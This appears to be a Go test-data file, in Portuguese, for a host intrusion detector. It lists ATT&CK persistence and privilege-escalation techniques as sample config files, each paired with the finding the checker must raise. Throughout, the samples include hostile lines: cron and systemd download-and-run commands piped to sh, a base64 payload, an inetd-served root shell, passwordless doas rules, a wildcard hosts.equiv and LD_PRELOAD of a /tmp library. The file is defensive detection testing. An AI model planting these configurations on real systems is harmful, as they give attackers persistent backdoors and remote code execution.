package variante

import "github.com/lex0c/aletheia/internal/check"

// tabela: cada técnica ATT&CK em várias formas.
//
// As FIRE são formas que um atacante escolhe de graça e que o check tem de
// pegar em todas. As BLIND são o mapa honesto: o ponto cego declarado, que o
// teste obriga a promover se um dia fechar.
var tabela = []tecnica{
	{
		attack: "T1574.006", nome: "ld_preload",
		variantes: []variante{
			{nome: "lib em tmp", esperaID: "persist.ld_preload_global", esperaSev: check.SevCritical,
				arquivos: map[string]string{"etc/ld.so.preload": "/tmp/.x.so\n"},
				nota:     "o caminho da lib é escolha do atacante"},
			{nome: "lib em usr local", esperaID: "persist.ld_preload_global",
				arquivos: map[string]string{"etc/ld.so.preload": "/usr/local/lib/libx.so\n"},
				nota:     "diretório de instalação manual não muda o fato: o preload é global"},
			{nome: "com espacos e comentario", esperaID: "persist.ld_preload_global",
				arquivos: map[string]string{"etc/ld.so.preload": "# comentário\n  /opt/e.so  \n"},
				nota:     "espaço em volta e comentário são ruído, a lib continua ali"},
			{nome: "duas libs", esperaID: "persist.ld_preload_global",
				arquivos: map[string]string{"etc/ld.so.preload": "/a.so\n/b.so\n"},
				nota:     "uma legítima ao lado da maliciosa não esconde a existência do arquivo"},
		},
	},
	{
		attack: "T1574.006", nome: "ld_so_conf",
		variantes: []variante{
			{nome: "diretorio gravavel direto", esperaID: "persist.ld_so_conf_odd",
				arquivos: map[string]string{"etc/ld.so.conf": "/tmp/libs\n"},
				nota:     "diretório de busca de biblioteca gravável por qualquer um"},
			{nome: "via include", esperaID: "persist.ld_so_conf_odd",
				arquivos: map[string]string{
					"etc/ld.so.conf": "include /etc/ld.so.conf.d/*.conf\ninclude /tmp/x.conf\n",
					"tmp/x.conf":     "/tmp/libs\n",
				},
				nota: "o include fora do padrão é o que o coletor tinha de seguir"},
		},
	},
	{
		attack: "T1053.003", nome: "cron_download",
		variantes: []variante{
			{nome: "pipe para sh", esperaID: "persist.cron_suspect",
				arquivos: map[string]string{"etc/cron.d/x": "* * * * * root curl -s http://198.51.100.7/a | sh\n"},
				nota:     "baixa-e-executa clássico"},
			{nome: "pipe para caminho absoluto", esperaID: "persist.cron_suspect",
				arquivos: map[string]string{"etc/cron.d/x": "* * * * * root curl -s http://198.51.100.7/a | /bin/sh\n"},
				nota:     "a evasão que zerava o check: interpretador por caminho absoluto"},
			{nome: "wget com tab", esperaID: "persist.cron_suspect",
				arquivos: map[string]string{"etc/cron.d/x": "* * * * * root wget -qO- http://198.51.100.7/a |\tsh\n"},
				nota:     "TAB no lugar do espaço não muda o que roda"},
			{nome: "reboot com tab", esperaID: "persist.cron_suspect",
				arquivos: map[string]string{"etc/cron.d/x": "@reboot\troot\tcurl -s http://198.51.100.7/a | sh\n"},
				nota:     "@reboot separado por tab: a persistência de boot mais barata"},
			{nome: "base64 decode", esperaID: "persist.cron_suspect",
				arquivos: map[string]string{"etc/cron.d/x": "* * * * * root echo aGk= | base64 -d | sh\n"},
				nota:     "payload ofuscado em base64"},
		},
	},
	{
		attack: "T1548.003", nome: "doas_nopasswd",
		variantes: []variante{
			{nome: "permit nopass grupo", esperaID: "priv.doas_nopasswd", esperaSev: check.SevCritical,
				arquivos: map[string]string{"etc/doas.conf": "permit nopass keepenv :wheel\n"},
				nota:     "root sem senha para todo o grupo wheel"},
			{nome: "permit nopass usuario", esperaID: "priv.doas_nopasswd", esperaSev: check.SevCritical,
				arquivos: map[string]string{"etc/doas.conf": "permit nopass eviluser\n"},
				nota:     "root sem senha, qualquer comando"},
			{nome: "permit COM senha nao dispara", esperaID: "priv.doas_nopasswd", cego: true,
				arquivos: map[string]string{"etc/doas.conf": "permit :wheel\n"},
				nota:     "sem nopass a senha ainda é pedida: não é backdoor"},
			{nome: "via doas.d", esperaID: "priv.doas_nopasswd", esperaSev: check.SevCritical,
				arquivos: map[string]string{"etc/doas.d/50-x.conf": "permit nopass backdoor\n"},
				nota:     "drop-in em doas.d, como o sudoers.d"},
		},
	},
	{
		attack: "T1021.004", nome: "host_trust",
		variantes: []variante{
			{nome: "hosts.equiv curinga", esperaID: "persist.host_trust", esperaSev: check.SevCritical,
				arquivos: map[string]string{"etc/hosts.equiv": "+\n"},
				nota:     "o + confia em qualquer host e qualquer usuário: login sem senha de qualquer lugar"},
			{nome: "hosts.equiv com comentario", esperaID: "persist.host_trust",
				arquivos: map[string]string{"etc/hosts.equiv": "# trust\n+\n"},
				nota:     "comentário antes do + não esconde o curinga"},
			{nome: "shosts.equiv nomeado", esperaID: "persist.host_trust", esperaSev: check.SevWarn,
				arquivos: map[string]string{"etc/shosts.equiv": "buildserver\n"},
				nota:     "host nomeado é raro em sistema moderno: aviso, mas achado"},
			{nome: "rhosts de root", esperaID: "persist.host_trust",
				arquivos: map[string]string{
					"etc/passwd":   "root:x:0:0::/root:/bin/sh\n",
					"root/.rhosts": "outro\n"},
				nota: ".rhosts de usuário: quem entra vira aquela conta sem autenticar"},
		},
	},
	{
		attack: "T1543", nome: "servico_legado",
		variantes: []variante{
			{nome: "inetd shell no connect", esperaID: "persist.trigger_exec", esperaSev: check.SevCritical,
				arquivos: map[string]string{"etc/inetd.conf": "9999 stream tcp nowait root /tmp/.x bash -i\n"},
				nota:     "o server (campo 6) é o programa que roda no connect"},
			{nome: "xinetd server em tmpfs", esperaID: "persist.trigger_exec",
				arquivos: map[string]string{
					"etc/xinetd.conf": "includedir /etc/xinetd.d\n",
					"etc/xinetd.d/bd": "service bd {\n server = /dev/shm/agent\n disable = no\n}\n"},
				nota: "server habilitado em tmpfs"},
			{nome: "xinetd desabilitado nao dispara", esperaID: "persist.trigger_exec", cego: true,
				arquivos: map[string]string{
					"etc/xinetd.conf":  "includedir /etc/xinetd.d\n",
					"etc/xinetd.d/off": "service off {\n server = /tmp/.y\n disable = yes\n}\n"},
				nota: "disable = yes: o arquivo fica, mas não roteia; não é achado"},
			{nome: "inittab respawn de tmpfs", esperaID: "persist.trigger_exec", esperaSev: check.SevCritical,
				arquivos: map[string]string{"etc/inittab": "x:2345:respawn:/tmp/.boot\n"},
				nota:     "respawn roda no boot e reergue"},
		},
	},
	{
		attack: "T1543.002", nome: "unit_download",
		variantes: []variante{
			{nome: "ExecStart pipe sh", esperaID: "persist.unit_exec_suspect",
				arquivos: map[string]string{
					"etc/systemd/system/x.service": "[Service]\nExecStart=/bin/sh -c \"curl -s http://198.51.100.7/a | sh\"\n"},
				nota: "unit que baixa e executa"},
			{nome: "ExecStart caminho absoluto", esperaID: "persist.unit_exec_suspect",
				arquivos: map[string]string{
					"etc/systemd/system/x.service": "[Service]\nExecStart=/bin/sh -c \"curl -s http://198.51.100.7/a | /usr/bin/bash\"\n"},
				nota: "mesma evasão da cron, na unit"},
			{nome: "ExecStart em tmpfs", esperaID: "persist.unit_exec_suspect",
				arquivos: map[string]string{
					"etc/systemd/system/x.service": "[Service]\nExecStart=/dev/shm/agent\n"},
				nota: "binário em tmpfs: some no reboot"},
			{nome: "LD_PRELOAD via EnvironmentFile", esperaID: "persist.env_preload", esperaSev: check.SevCritical,
				arquivos: map[string]string{
					"etc/systemd/system/x.service": "[Service]\nExecStart=/usr/bin/d\nEnvironmentFile=/etc/.env\n",
					"etc/.env":                     "LD_PRELOAD=/tmp/.evil.so\n"},
				nota: "o preload escondido no arquivo referenciado, não na unit"},
		},
	},
}
